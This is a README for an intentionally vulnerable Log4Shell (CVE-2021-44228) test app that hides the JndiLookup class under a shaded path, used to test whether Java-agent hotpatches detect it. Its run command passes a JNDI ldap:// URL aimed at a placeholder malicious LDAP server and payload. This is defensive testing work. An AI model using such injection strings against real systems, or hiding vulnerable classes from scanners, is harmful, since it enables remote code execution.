# Log4Shell sample vulnerable application (CVE-2021-44228)

This application was created to test mitigation techniques based on Java-Agents that patch the `JndiLookup` class, such as
- https://github.com/nccgroup/log4j-jndi-be-gone
- https://github.com/corretto/hotpatch-for-apache-log4j2

This application contains the `JndiLookup` classes under a shaded path, i.e. at
`org/apache/logging/log4j/core/shaded/lookup/JndiLookup.class` (n.b. `/shaded/`)

At the time of writing, both above projects are unable to recognize such instances.

Admittedly, it's a contrived example and only covers an edge case, but better be safe than sorry.

## How to build
`./mvnw clean package`

## How to execute
`java -jar target/vulnerable-shaded-app-0.0.1-SNAPSHOT.jar ldap://<test-malicious-ldap-server>:1389/<payload>`

